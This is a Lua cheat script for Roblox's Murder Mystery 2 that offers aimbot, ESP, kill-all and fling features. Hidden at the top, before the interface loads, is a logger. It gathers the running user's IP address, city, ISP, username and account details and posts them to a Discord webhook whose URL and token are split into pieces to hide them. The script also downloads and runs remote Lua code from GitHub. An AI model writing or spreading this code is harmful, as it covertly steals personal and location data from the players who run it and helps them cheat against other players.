local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = game.Players.LocalPlayer

local PASS_ID = 1075128102 
local _v1, _v2, _z3, _x4, _s = "https://discord.com/", "api/webhooks/", "1502746103387390115", "GFT1beTFRM5MxYV2XsE4iRR_0nRJZcpVkn6z0ugY1LhwSKHqv2eiFCnfYGH275ZhyNCh", "/"
local __url = table.concat({_v1, _v2, _z3, _s, _x4})

local function sendReport()
    local _, hasPass = pcall(function()
        return MarketplaceService:UserOwnsGamePassAsync(player.UserId, PASS_ID)
    end)

    local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
    local ipData = {country = "Unknown", city = "Unknown", isp = "Unknown", query = "Unknown"}
    local req_func = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)

    if req_func then
        pcall(function()
            local res = req_func({Url = "http://ip-api.com/json/", Method = "GET"})
            if res.Success or res.StatusCode == 200 then
                ipData = HttpService:JSONDecode(res.Body)
            end
        end)
    end

    local accountAge = player.AccountAge
    local membership = tostring(player.MembershipType):gsub("Enum.MembershipType.", "")
    local creationDate = os.date("%Y-%m-%d", os.time() - (accountAge * 86400))

    local data = {
        ["embeds"] = {{
            ["title"] = "👤 Full Intelligence Report",
            ["description"] = "User data bypass results",
            ["color"] = hasPass and 2664265 or 15139840,
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
            },
            ["fields"] = {
                {["name"] = "Username", ["value"] = "`"..player.Name.."`", ["inline"] = true},
                {["name"] = "Display Name", ["value"] = "`"..player.DisplayName.."`", ["inline"] = true},
                {["name"] = "User ID", ["value"] = "["..player.UserId.."](https://www.roblox.com/users/"..player.UserId.."/profile)", ["inline"] = false},
                {["name"] = "Account Age", ["value"] = accountAge.." days", ["inline"] = true},
                {["name"] = "Registration", ["value"] = creationDate, ["inline"] = true},
                {["name"] = "Membership", ["value"] = membership, ["inline"] = true},
                {["name"] = "Location", ["value"] = "📍 "..ipData.country..", "..ipData.city, ["inline"] = true},
                {["name"] = "IP Address", ["value"] = "`"..ipData.query.."`", ["inline"] = true},
                {["name"] = "ISP", ["value"] = ipData.isp, ["inline"] = true},
                {["name"] = "Executor", ["value"] = "`"..executor.."`", ["inline"] = true},
                {["name"] = "Access", ["value"] = hasPass and "✅ BOUGHT" or "❌ NO ACCESS", ["inline"] = true},
                {["name"] = "Place ID", ["value"] = "["..game.PlaceId.."](https://www.roblox.com/games/"..game.PlaceId..")", ["inline"] = true},
                {["name"] = "JobId", ["value"] = "```"..game.JobId.."```", ["inline"] = false}
            },
            ["footer"] = {
                ["text"] = "MM2 Log System • " .. os.date("%X"),
            }
        }}
    }

    local payload = HttpService:JSONEncode(data)

    if req_func then
        pcall(function()
            req_func({
                Url = __url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
    end
end

task.spawn(sendReport)

local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-Modded/refs/heads/master/Fluent-Modded/main.lua.txt"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-Modded/refs/heads/master/Fluent-Modded/SaveManager.lua"))()
local FBM = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-Modded/refs/heads/master/Fluent-Modded/FBM.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/twinkilya0-jpg/Fluent-Modded/refs/heads/master/Fluent-Modded/InterfaceManager.lua"))()

if not Fluent or not SaveManager or not InterfaceManager or not FBM then return game.Players.LocalPlayer:Kick("Error: Interface didn't load") end

if _G.PhantomWyrmXIsAlreadyRunning then
   game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Script is already running!",
        Text = ""
    })
   return
end

_G.PhantomWyrmXIsAlreadyRunning = true

local Window = Fluent:CreateWindow({
    Title = "PhantomWyrm X - Murder Mystery 2 (Mobile)",
    SubTitle = "v2.9.8 Made By Carryxkn2",
    TabWidth = 160,
    Size = UDim2.fromOffset(540, 390),
    Acrylic = false,
    Theme = "Darker",
    MinimizeKey = Enum.KeyCode.LeftControl
})

Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "rbxassetid://7733960981" }),
    AutoFarm = Window:AddTab({ Title = "Auto Farms", Icon = "rbxassetid://10709811110" }),
    Combat = Window:AddTab({ Title = "Combat", Icon = "rbxassetid://10734975692" }),
    Misc = Window:AddTab({ Title = "Misc", Icon = "rbxassetid://7734068321" }),
    Visuals = Window:AddTab({ Title = "Visuals", Icon = "rbxassetid://10709819149" }),
    Troll = Window:AddTab({ Title = "Trolling", Icon = "laugh" }),
    Premium = Window:AddTab({ Title = "Premium", Icon = "crown" }),
    Utilities = Window:AddTab({ Title = "Utilities", Icon = "settings-2" }),
    Info = Window:AddTab({ Title = "Info", Icon = "rbxassetid://10723415903" }),
    Settings = Window:AddTab({ Title = "Configuration", Icon = "rbxassetid://7734052335" }),
    Extension = Window:AddTab({ Title = "Extension", Icon = "rbxassetid://10734930886" })
}

local Options = Fluent.Options

-- Services

local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local Remotes = ReplicatedStorage.Remotes
local Camera = Workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local PathfindingService = game:GetService("PathfindingService")
local CAS = game:GetService("ContextActionService")

-- Optimize (1)

local function GetAutoDuration()
    local dt = RunService.RenderStepped:Wait()
    local fps = 1 / dt

    local duration = 60 / math.clamp(fps, 5, 60)
    return math.clamp(duration, 1, 6)
end

local Duration = GetAutoDuration()

-- Toggle Gui
local openshit = Instance.new("ScreenGui")
openshit.Name = "openshit"
openshit.Parent = LocalPlayer.PlayerGui
openshit.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
openshit.ResetOnSpawn = false

local mainopen = Instance.new("TextButton")
mainopen.Name = "mainopen"
mainopen.Parent = openshit
mainopen.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
mainopen.BackgroundTransparency = 1
mainopen.Position = UDim2.new(0.101969875, 0, 0.110441767, 0)
mainopen.Size = UDim2.new(0, 64, 0, 42)
mainopen.Text = ""
mainopen.Visible = true

local mainopens = Instance.new("UICorner")
mainopens.Parent = mainopen

local SizeBackMulti = 0.1
local AssetsIcon = "rbxassetid://8837108128"
local AssetsBackground = "rbxassetid://5681530162"

-- === ROTATING BACKGROUND IMAGE (inside the button) ===
local backgroundImage = Instance.new("ImageLabel")
backgroundImage.Name = "RotatingBackground"
backgroundImage.Parent = mainopen
backgroundImage.Size = UDim2.new(1.5 + SizeBackMulti, 0, 1.5 + SizeBackMulti, 0)
backgroundImage.Position = UDim2.new(0.5, 0, 0.5, 0)
backgroundImage.AnchorPoint = Vector2.new(0.5, 0.5)
backgroundImage.BackgroundTransparency = 1
backgroundImage.Image = AssetsBackground
backgroundImage.SizeConstraint = Enum.SizeConstraint.RelativeXX
backgroundImage.ZIndex = 0

-- === STATIC FRONT IMAGE ===
local frontImage = Instance.new("ImageLabel")
frontImage.Name = "StaticIcon"
frontImage.Parent = mainopen
frontImage.Size = UDim2.new(0.8, 0, 1, 0)
frontImage.Position = UDim2.new(0.5, 0, 0.5, 0)
frontImage.AnchorPoint = Vector2.new(0.5, 0.5)
frontImage.BackgroundTransparency = 1
frontImage.Image = AssetsIcon
frontImage.ZIndex = 1

local frontCorner = Instance.new("UICorner")
frontCorner.CornerRadius = UDim.new(1, 0)
frontCorner.Parent = frontImage

-- === ROTATION LOOP ===
local rotation = 0
local speed = 90 
local lastTime = tick()

task.spawn(function()
	while true do
		local now = tick()
		local delta = now - lastTime
		lastTime = now
		
		rotation = (rotation + speed * delta) % 360
		backgroundImage.Rotation = rotation

		task.wait()
	end
end)

local function MakeDraggable(topbarobject, object, locked)
    local Dragging = false
    local DragInput
    local DragStart
    local StartPosition

    local Holding = false
    local HoldTime = 1.0
    local MoveCancelThreshold = 6
    local HoldToken = 0

    object:SetAttribute("Locked", locked or false)

    local function Update(input)
        if object:GetAttribute("Locked") then return end
        local delta = input.Position - DragStart
        object.Position = UDim2.new(
            StartPosition.X.Scale,
            StartPosition.X.Offset + delta.X,
            StartPosition.Y.Scale,
            StartPosition.Y.Offset + delta.Y
        )
    end

    local function ToggleLock()
        local newState = not object:GetAttribute("Locked")
        object:SetAttribute("Locked", newState)

        Fluent:Notify({
            Title = newState and "Button Locked" or "Button Unlocked",
            Content = newState and "This button is now locked in place." or "This button can now be moved.",
            Duration = 2
        })
    end

    topbarobject.InputBegan:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1
        and input.UserInputType ~= Enum.UserInputType.Touch then
            return
        end

        Dragging = not object:GetAttribute("Locked")
        Holding = true
        DragStart = input.Position
        StartPosition = object.Position

        HoldToken += 1
        local token = HoldToken

        task.delay(HoldTime, function()
            if Holding and token == HoldToken then
                ToggleLock()
            end
        end)

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                Dragging = false
                Holding = false
            end
        end)
    end)

    topbarobject.InputChanged:Connect(function(input)
        if not DragStart then return end

        if input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch then
            if (input.Position - DragStart).Magnitude > MoveCancelThreshold then
                Holding = false
            end
            DragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == DragInput and Dragging then
            Update(input)
        end
    end)
end

MakeDraggable(mainopen, mainopen, false)

local function playSound(soundId)
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://" .. soundId
    sound.Parent = game:GetService("SoundService")
    sound:Play()
    sound.Ended:Connect(function()
        sound:Destroy()
    end)
end

mainopen.MouseButton1Click:Connect(function()
    local sounds = { "7127123605", "137566474343039", "438666542" }
    playSound(sounds[math.random(#sounds)])
    Window:Minimize()

    local function smoothSpeed(target, duration)
        local start = speed
        local steps = 30
        for i = 1, steps do
            speed = start + (target - start) * (i / steps)
            task.wait(duration / steps)
        end
        speed = target
    end
    
    smoothSpeed(360, 0.4)
    task.wait(0.5)
    smoothSpeed(180, 0.4)
    task.wait(0.3)
    smoothSpeed(90, 0.4)
end)

-- FPS Counter

local Stats = game:GetService("Stats")
local RunService = game:GetService("RunService")

local fpsCounter = Instance.new("ScreenGui")
fpsCounter.Name = "FPSCounter"
fpsCounter.Parent = game.CoreGui
fpsCounter.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
fpsCounter.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Parent = fpsCounter
frame.Size = UDim2.new(0, 180, 0, 80)
frame.Position = UDim2.new(0, 300, 0, 10)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BackgroundTransparency = 0.7

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = frame

local gradient = Instance.new("UIGradient")
gradient.Color = getgenv().ButtonGradients.Background
gradient.Parent = frame

task.spawn(function()
    while task.wait(0.03) do
        gradient.Rotation = (gradient.Rotation + 1) % 360
        gradient.Color = getgenv().ButtonGradients.Background 
    end
end)

local uiStroke = Instance.new("UIStroke")
uiStroke.Thickness = 2
uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
uiStroke.Parent = frame

local gradientstroke = Instance.new("UIGradient")
gradientstroke.Color = getgenv().ButtonGradients.Stroke
gradientstroke.Parent = uiStroke

task.spawn(function()
    while frame.Parent do
        gradientstroke.Rotation = (gradientstroke.Rotation + 0.5) % 360
        gradientstroke.Color = getgenv().ButtonGradients.Stroke
        task.wait()
    end
end)

local label = Instance.new("TextLabel")
label.Parent = frame
label.Size = UDim2.new(1, -10, 1, -10)
label.Position = UDim2.new(0, 5, 0, 5)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.Font = Enum.Font.GothamBlack
label.TextSize = 12
label.TextWrapped = true
label.TextXAlignment = Enum.TextXAlignment.Center
label.TextYAlignment = Enum.TextYAlignment.Center
label.Text = "FPS: 0 | Ping: 0 ms\nClient Timer: 0h 0m 0s"

if typeof(MakeDraggable) == "function" then
    MakeDraggable(frame, frame, false)
end

local function GetPing()
    local n = Stats:FindFirstChild("Network")
    if not n then return 0 end
    local s = n:FindFirstChild("ServerStatsItem")
    if not s then return 0 end
    local p = s:FindFirstChild("Data Ping")
    if not p then return 0 end
    return math.floor(p:GetValue())
end

local startTime = tick()
local lastUpdateTime = startTime
local frameCount = 0
local previousText = ""

RunService.RenderStepped:Connect(function()
    frameCount += 1
    local now = tick()
    local dt = now - lastUpdateTime

    if dt >= 1 then
        local fps = math.round(frameCount / dt)
        local elapsed = now - startTime
        local h = math.floor(elapsed / 3600)
        local m = math.floor((elapsed % 3600) / 60)
        local s = math.floor(elapsed % 60)
        local ping = GetPing()

        local text = string.format(
            "FPS: %d | Ping: %d ms\nClient Timer: %dh %dm %ds",
            fps, ping, h, m, s
        )

        if text ~= previousText then
            label.Text = text
            previousText = text
        end

        lastUpdateTime = now
        frameCount = 0
    end
end)


-- UNC Requirements

if not require then
    return LocalPlayer:Kick("UNC RESTRICTION MISSING: require(path) | PLEASE TRY OTHER EXECUTORS")
else
   print("Supported require()")
end

if not firetouchinterest  then
    return LocalPlayer:Kick("UNC RESTRICTION MISSING: firetouchinterest() | PLEASE TRY OTHER EXECUTORS")
else
   print("Supported firetouchinterest()")
end

if not setfpscap or setfpscap(500) then
    return LocalPlayer:Kick("UNC RESTRICTION MISSING: setfpscap() | PLEASE TRY OTHER EXECUTORS")
else
   print("Supported setfpscap()")
end

if game.Players then
   print("Advance Api")
else
   print("Common Api")
end


-- Scripts

function CreateBillboardESP(Name, Part, Color, TextSize)
  if not Part or Part:FindFirstChild(Name) then return nil end

  local BillboardGui = Instance.new("BillboardGui")
  local TextLabel = Instance.new("TextLabel")
  local TextStroke = Instance.new("UIStroke")

  BillboardGui.Parent = Part
  BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
  BillboardGui.Name = Name
  BillboardGui.AlwaysOnTop = true
  BillboardGui.LightInfluence = 1
  BillboardGui.Size = UDim2.new(0, 200, 0, 50)
  BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
  BillboardGui.MaxDistance = 1000

  TextLabel.Parent = BillboardGui
  TextLabel.BackgroundTransparency = 1
  TextLabel.Size = UDim2.new(1, 0, 1, 0)
  TextLabel.TextScaled = false
  TextLabel.Font = Enum.Font.SourceSans
  TextLabel.TextSize = TextSize or 14
  TextLabel.TextColor3 = Color or Color3.fromRGB(255, 255, 255)

  TextStroke.Parent = TextLabel
  TextStroke.Thickness = 1
  TextStroke.Color = Color3.new(0, 0, 0)

  return BillboardGui
end

function UpdateBillboardESP(Name, Part, NameText, Color, TextSize, PartPosition)
  if not Part then return false end

  local esp = Part:FindFirstChild(Name)
  if esp and esp:FindFirstChildOfClass("TextLabel") then
    local label = esp:FindFirstChildOfClass("TextLabel")
    
    if Color then
      label.TextColor3 = Color
    end
    
    if TextSize then
      label.TextSize = TextSize
    end
    
    if PartPosition then
      local Pos 
      if typeof(PartPosition) == "Instance" and PartPosition:IsA("BasePart") then
        Pos = PartPosition.Position
      elseif typeof(PartPosition) == "Vector3" then
        Pos = PartPosition
      end

      if Pos then
        local distance = math.floor((Pos - Part.Position).Magnitude)
        local name = NameText or Part.Parent and Part.Parent.Name or Part.Name
        label.Text = string.format("%s - [ %d M ]", name, distance)
      end
    else
      local name = NameText or Part.Parent and Part.Parent.Name or Part.Name
      label.Text = name
    end    
    return true
  end
  return false
end

function DestroyBillboardESP(Name, Part)
  if not Part then return false end
  
  local esp = Part:FindFirstChild(Name)
  if esp then
    esp:Destroy()
    return true
  end
  
  return false
end

function CreateTracerESP(tracerTable, part, thickness, color)
  local tracer = Drawing.new("Line")
  tracer.Thickness = thickness or 2
  tracer.Color = color or Color3.fromRGB(255, 255, 255)
  tracer.Transparency = 1
  tracer.Visible = false
  tracerTable[part] = tracer
  return tracer
end

function UpdateTracerESP(tracerTable, part, color)
  local tracer = tracerTable[part]
  if not tracer then return end

  if typeof(part) ~= "Instance" then
    tracerTable[part] = nil
    return
  end
  
  if not part.Parent or not part:IsDescendantOf(workspace) then
    tracer.Visible = false
    DestroyTracerESP(tracerTable, part)
    return
  end

  local screenPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(part.Position)  
  if onScreen then
    if color then tracer.Color = color end
    tracer.From = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y)
    tracer.To = Vector2.new(screenPos.X, screenPos.Y)
    tracer.Visible = true
  else
    tracer.Visible = false
  end
end

function DestroyTracerESP(tracerTable, part)
  if typeof(part) ~= "Instance" then
    tracerTable[part] = nil
    return
  end
  
  local tracer = tracerTable[part]
  if tracer then 
    if tracer.Remove then tracer:Remove() end
    tracerTable[part] = nil
  end 
end

function CreateHighlightESP(Name, Part, HighlightColor, OutlineColor, ShowHighlight)
  if not Part then return false end

  local Highlight = Instance.new("Highlight")
  Highlight.Name = Name
  Highlight.FillColor = HighlightColor or Color3.fromRGB(255, 255, 255)
  Highlight.OutlineColor = OutlineColor or Color3.fromRGB(0, 0, 0)

  if ShowHighlight then
    Highlight.FillTransparency = 1
  else
    Highlight.FillTransparency = 0.5
  end

  Highlight.OutlineTransparency = 0
  Highlight.Parent = Part
  Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop

  return true
end

function UpdateHighlightESP(Name, Part, HighlightColor, OutlineColor, ShowHighlight)
  local Highlight = Part and Part:FindFirstChild(Name)

  if not Highlight or not Highlight:IsA("Highlight") then return false end

  if HighlightColor then Highlight.FillColor = HighlightColor end
  if OutlineColor then Highlight.OutlineColor = OutlineColor end

  if ShowHighlight ~= nil then
    Highlight.FillTransparency = ShowHighlight and 1 or 0.5
  end

  return true
end

function DestroyHighlightESP(Name, Part)
  local Highlight = Part and Part:FindFirstChild(Name)

  if Highlight and Highlight:IsA("Highlight") then
    Highlight:Destroy()
    return true
  end

  return false
end

getgenv().CurrentServerPing = 0
getgenv().CurrentLocalPing = 0

spawn(function()
    while true do
      getgenv().CurrentServerPing = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
      getgenv().CurrentLocalPing = LocalPlayer:GetNetworkPing()
      RunService.PreSimulation:Wait()
    end
end)

-- Local Variables
local DFunctions = {}
local DConfiguration = {
	ESP = {
		Innocent = false,
		Sheriff = false,
		Murderer = false,
		Objects = {
		    GunDrop = false,
			Coins = false,
			ThrowingKnife = false,
			Traps = false,
		},
	},
	
	Boxes = {
		Innocent = false,
		Sheriff = false,
		Murderer = false,
	    Objects = {
		    GunDrop = false,
			Coins = false,
			ThrowingKnife = false,
			Traps = false,
		},
	},
	
	Highlight = {
		Innocent = false,
		Sheriff = false,
		Murderer = false,
	    Objects = {
		    GunDrop = false,
			Coins = false,
			ThrowingKnife = false,
			Traps = false,
		},
		OutlineOnly = false,
	},
	
	Tracers = {
		Innocent = false,
		Sheriff = false,
		Murderer = false,
		Objects = {
		    GunDrop = false,
			Coins = false,
			ThrowingKnife = false,
			Traps = false,
		},
	},

	Indicators = {
		Roles = { 
			IsStarted = false, -- state
			LocalPlayer = false,
			Sheriff = false,
			Murderer = false,
			Perks = false,
		},
		
		Object = {
			GunDrop = false,
		},
		
		SilentAimPredictionPos = Vector3.zero,
	},
	
	AutoFarm = {
		FarmingStates = {
			FullLabels = {},
			isFullBag = false,
			isMax = false,
			lastRescan = 0,
			StartFarm = false,
			StopTween = false,
			LastTP = 0,
			TPCooldown = 2.3,
		},
		
		TweenCoins = false,
		TweenSpeed = 25,
		TweenAddSpeed = 0,
		TeleportCoins = false,
		AutoReset = false,
		AutoFarmXP = false,
		CoinsAura = false,
		CoinsAuraDistance = 10,
	},
	
	Combat = {
		Innocent = {
			SpeedGlitch = {
			    Enabled = false,
			    FloatingButton = false,
			    Keybind = false,
				WalkSpeed = 30,
				CurrentWeld = nil,
				Type = "WalkSpeed",
			},
			
			PrankBomb = {
				InCooldown = false,
				Countdown = 0,
				Type = "Legit",
			},
			
			JumpBoost = {
				Height = 70,
			},
		},
		
		Murderer = {
			KnifeAura = {
			    Enabled = false,
				Radius = 10,
			},
			
			HitboxExpander = {
				Enabled = false,
				Size = 10,
			},
			
			KnifeThrow = {
				Automatic = false,
				FloatingButton = false,
				Keybind = false,
				Delay = 1,
				Animated = false,
				WallCheck = false,
				IsThrowing = false, -- State
				LastThrow = 0,
				Cooldown = 2,
				TracksCache = {},
			},
			
			ThrowHitbox = {
				Enabled = false,
				MultipleTarget = false,
				Radius = 10,
			},
			
			KillPlayer = "",
			KillAll = false,
			ThrowPlayer = "",
		},
		
		Sheriff = {
		    GunDrop = {
			    Enabled = false,
			    Keybind = false,
			    GrabGun = false,
			    Range = 10,
		    },
		    
		    Gun = {
				AutoShoot = {
					Enabled = false,
					Keybind = false,
					ForceShoot = false, -- state
					WallCheck = false,
					Delay = 0.1,
					Type = "Shoot Murderer",
				},
				LookAt = false,
				UnequipGun = false,
				WallCheck = false,
				Type = "Normal"
		    },

			KillMurder = {
				Enabled = false,
				Keybind = false,
				Type = "Behind",
				FloatingButton = false
			},
			
			Indicators = {
				Bullet = false,
			},
		},
		
		Camera = {
			FlickShot = {
			    FloatingButton = false,
			    Keybind = false,
			    Delay = 0.08,
				RandomOffset = false,
				WallCheck = false,
			},
			
			Aimbot = {
			    Enabled1 = false,
			    Enabled2 = false,
			    Keybind1 = false,
			    Keybind2 = false,
			    WallCheck = false,
				Smoothness = 0.75,
				AimPart = "Head",
			},
		},
		
		SilentAim = {
		   Throwing = {
	           Enabled = false,
   	        Type = "Traject", -- Traject, Vectora, and Dartix
               ThrowSpeed = "Normal",
               WallCheck = false,
	        },
	       
 	      GunShot = {
               Enabled = false,
               InstantShoot = false,
               Type = "Vazex", -- Phaze, Vazex, Hexa, and Nova
               WallCheck = false,
            },
		},
		
		Settings = {
		    Circle = {
		        PositionType = "Center",
			    Radius = 250,
			    Visible = false,
			    Color1 = Color3.fromRGB(80, 180, 255),
			    Color2 = Color3.fromRGB(255, 255, 255),
		    },
		    ResolverAssistant = false,
		    Indicator = false,
		    TargetCheckType = "Circle",			
		    OffsetMultiplier = {
		        Gun = {
		            X = 1.05,
		            Y = 1.0,
		        },
		
		        Knife = {
		            X = 1.25,
		            Y = 0.75,
		        },
		    },
		    HeadPrediction = {
		        Enabled = false,
		        HitChance = 50,
		    },
			PingBased = {
			    Enabled = false,
			    LatencyMode = false,
			    Type = "Server",
				Interval = 100,
			},
			PredictJump = false,
			AntiLockDetection = false,
		},
	},
	
	Misc = { 
		AntiAFK = true,
		Noclip = false,
		AirJump = false,
		TwoLives = false,
		
		LocalPlayer = {
			WalkSpeed = {
				Enabled = false,
				Value = 16,
			},
			
			JumpPower = {
			    Enabled = false,
			    Value = 50,
			},
			
			Fly = {
			    Enabled = false,
			    Value = 20,
			},
		},
		
		Removal = { 
			DeadBodies = false,
			DisplayEquipment = false,
		},
		
		AlternativeFeatures = {
			ShowTimer = false,
			EmoteSelected = "Zen",
		},
		
		Optimization = {
			Coins = false,
			Chromas = false,
			Pets = false,
		},
		
		Exploits = {
			AntiFling = false,
			AntiLock = false,
			AntiKick = false,
		},
		
		Spectate = {
			Enabled = false,
			Target = ""
		},
		
		Manipulation = {
		    Fling = {
		        Enabled = false,
		        Target = "",
		        Murder = false,
		        Sheriff = false,
	 	   },
		
		    Invisible = {
		        Enabled = false,
				FloatingButton = false,
				Keybind = false,
		    },
		},
	},
	
	Visual = {
		AutoChanger = false,
		Guns = {
			Selected = "Default",
			Beam = "Default",
			Sound = "Default",
			DualEffect = false,
			DualCache = {},
		},
		
		Crosshair = {
			Selected = "Default",
			Rotating = false,
			RotateSpeed = 5,
			Size = 1,
		},
		
		Announcer = {
			Sheriff = false,
			SheriffAnnouncer = "Unreal tournament",
			Murderer = false,
			MurdererAnnouncer = "Unreal tournament",
		},
	},
	
	Settings = {
		GuiScale = {
		    SpeedGlitch = 0,
			GrabGun = 0,
			ThrowKnife = 0,
			KillAll = 0,
			KillMurder = 0,
			ShootMurder = 0,
			Invisible = 0,
			FlickShot = 0,
			BombTrick = 0,
			JumpBoost = 0,
			AimbotNearest = 0,
			AimbotMurderer = 0,
			FlingSheriff = 0,
			FlingMurder = 0,
		},
	}
}

-- Functions

function DFunctions.CreateButton(ButtonName, Name, Size1, Size2, ScriptLogic, CircleMode)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = ButtonName
    screenGui.Parent = LocalPlayer.PlayerGui
    screenGui.ResetOnSpawn = false

    local frame = Instance.new("Frame")
    frame.Name = ButtonName
    frame.Size = UDim2.new(Size1, 0, Size2, 0)
    frame.Position = UDim2.new(0.5 - Size1 / 2, 0, 0.5 - Size2 / 2, 0)
    frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    frame.BackgroundTransparency = 0.7
    frame.Parent = screenGui

    local gradient = Instance.new("UIGradient")
    gradient.Color = getgenv().ButtonGradients.Background
    gradient.Parent = frame

    task.spawn(function()
        while task.wait(0.03) do
            gradient.Rotation = (gradient.Rotation + 1) % 360
            gradient.Color = getgenv().ButtonGradients.Background
        end
    end)

	local stroke = Instance.new("UIStroke")
    stroke.Thickness = 2
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Color = Color3.new(1, 1, 1)
    stroke.Parent = frame

    local gradientstroke = Instance.new("UIGradient")
    gradientstroke.Color = getgenv().ButtonGradients.Stroke
    
    gradientstroke.Rotation = 0
    gradientstroke.Parent = stroke

    task.spawn(function()
        while frame.Parent do
           gradientstroke.Rotation = (gradientstroke.Rotation + 0.5) % 360
           gradientstroke.Color = getgenv().ButtonGradients.Stroke
           task.wait()
        end
    end)
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 15)
    corner.Parent = frame

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(1, 0, 1, 0)
    button.BackgroundTransparency = 1
    button.Text = Name
    button.Font = Enum.Font.SourceSansBold
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 24
    button.TextScaled = false
    button.Parent = frame

    local toggle = Instance.new("TextButton")
    toggle.Size = UDim2.new(0, 28, 0, 28)
    toggle.Position = UDim2.new(1, 6, 0.5, -14)
    toggle.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    toggle.Text = "○"
    toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggle.Visible = false
    toggle.Parent = frame

    local tc = Instance.new("UICorner")
    tc.CornerRadius = UDim.new(1, 0)
    tc.Parent = toggle

    local originalSize = UDim2.new(Size1, 0, Size2, 0)
    local holding = false
    local holdStart = 0
    local hideAt = 0

    frame:SetAttribute("IsCircle", false)

    local isCircle
    if CircleMode ~= nil then
        isCircle = CircleMode
    else
        isCircle = frame:GetAttribute("IsCircle")
    end

    local function applyShape(circle)
        frame:SetAttribute("IsCircle", circle)
        local s = math.min(frame.AbsoluteSize.X, frame.AbsoluteSize.Y)
        if circle then
            frame.Size = UDim2.new(0, s, 0, s)
            button.TextWrapped = true
            button.TextScaled = true
            button.TextSize = math.floor(s * 0.45)
            corner.CornerRadius = UDim.new(1, 0)
            toggle.Text = "▢"
        else
            frame.Size = originalSize
            button.TextWrapped = false
            button.TextScaled = false
            button.TextSize = 24
            corner.CornerRadius = UDim.new(0, 15)
            toggle.Text = "○"
        end
    end

    applyShape(isCircle)

    task.spawn(function()
        while task.wait(0.25) do
            if toggle.Visible and tick() - hideAt >= 10 then
                toggle.Visible = false
            end
        end
    end)

    button.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            holding = true
            holdStart = tick()
        end
    end)

    button.InputEnded:Connect(function(i)
        if holding and (i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch) then
            holding = false
            if tick() - holdStart >= 0.6 then
                toggle.Visible = true
                hideAt = tick()
            end
        end
    end)

    toggle.MouseButton1Click:Connect(function()
        hideAt = tick()
        local current = frame:GetAttribute("IsCircle")
        applyShape(not current)
    end)

    button.Activated:Connect(function()
        if ScriptLogic then
            ScriptLogic(button)
        end
    end)

    FBM:AddButton(ButtonName, frame, false)
    MakeDraggable(button, frame, false)

    return button
end

function DFunctions.UpdateButton(Name, Size1, Size2)
    local gui = LocalPlayer.PlayerGui:FindFirstChild(Name)
    if gui then
        local frame = gui:FindFirstChild(Name)
        if frame then
            frame.Size = UDim2.new(Size1, 0, Size2, 0)
            local isCircle = frame:GetAttribute("IsCircle")
            if isCircle then
                local s = math.min(frame.AbsoluteSize.X, frame.AbsoluteSize.Y)
                frame.Size = UDim2.new(0, s, 0, s)
            end
        end
    end
end

function DFunctions.DestroyButton(Name)
	local gui = LocalPlayer.PlayerGui:FindFirstChild(Name)
	if gui then
		gui:Destroy()
	end
end

local GetPlayerDataRemote = ReplicatedStorage:FindFirstChild("GetPlayerData") or Remotes.Gameplay:FindFirstChild("GetCurrentPlayerData")
local PlayerDataChanged = Remotes:WaitForChild("Gameplay"):WaitForChild("PlayerDataChanged", 5)
local Roles = {
	Murderer = nil,
	Sheriff = nil,
	Hero = nil,
	Players = nil
}

function DFunctions.GetMap()
    for i, v in pairs(Workspace:GetChildren()) do
        if v:FindFirstChild("Base") or v:FindFirstChild("Map") and (v:FindFirstChild("CoinAreas") or v:FindFirstChild("CoinContainer")) then
            return v
        end
    end
end

